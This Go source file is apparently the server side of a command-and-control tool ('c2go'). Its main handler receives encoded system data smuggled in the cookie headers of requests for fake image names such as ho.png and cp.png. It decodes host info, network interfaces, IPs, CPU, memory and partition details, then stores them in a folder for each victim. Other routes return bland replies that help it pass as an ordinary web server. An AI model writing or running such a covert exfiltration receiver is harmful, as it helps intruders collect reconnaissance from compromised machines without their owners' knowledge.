package main

import (
	"github.com/labstack/echo/v4"
	"libs"
	"net/http"
	"os"
	"path"
	"strings"
)

func printRequest(debug bool, c echo.Context) {
	utils.PrintDebug(debug, "%s > Handling %s:%s", c.RealIP(), c.Request().Method, c.Request().RequestURI)
}

func handlerBasicGet(c echo.Context) error {
	printRequest(debug, c)
	return c.String(http.StatusOK, "ok")
}

func handlerStaticGet(c echo.Context) error {
	printRequest(debug, c)
	utils.PrintDebug(debug, "%s < 404 - Not Found", c.RealIP())
	return c.String(http.StatusNotFound, "404: not found")
}

func handleInfoUpload(c echo.Context) error {
	var fileName string
	printRequest(debug, c)
	data := c.Request().Header.Get("cookie")
	guid := data[:strings.Index(data, "=")]
	data = data[strings.Index(data, "=")+1:]
	folderPath := "/home/develop/golang/src/ppamo.cl/c2go/hosts/" + guid
	imageName := path.Base(c.Request().URL.Path)
	decoded, err := utils.DecodeString(true, data)
	if err != nil {
		utils.PrintDebug(debug, "%s < error decoding data\n%v", c.RealIP(), err)
		return nil
	}

	switch {
	case imageName == "ho.png":
		fileName = "host_info.json"
	case imageName == "ni.png":
		fileName = "network_interfaces.json"
	case imageName == "hi.png":
		fileName = "hosts_ips.json"
	case imageName == "cp.png":
		fileName = "cpus.json"
	case imageName == "me.png":
		fileName = "memory.json"
	case imageName == "pa.png":
		fileName = "partitions.json"
	case imageName == "pu.png":
		fileName = "partitions_usage.json"
	default:
		fileName = "default.json"
	}

	os.Mkdir(folderPath, 0755)

	if _, err := os.Stat(folderPath + "/" + fileName); err == nil {
		os.Remove(folderPath + "/" + fileName)
	}
	f, err := os.Create(folderPath + "/" + fileName)
	if err != nil {
		utils.PrintDebug(debug, "%s < error creating file %s\n%v", c.RealIP(), fileName, err)
		return nil
	}
	defer f.Close()
	_, err = f.WriteString(decoded)
	if err != nil {
		utils.PrintDebug(debug, "%s < error writing to file %s\n%v", c.RealIP(), fileName, err)
		return nil
	}
	utils.PrintDebug(debug, "%s < info saved", c.RealIP())
	return nil
}
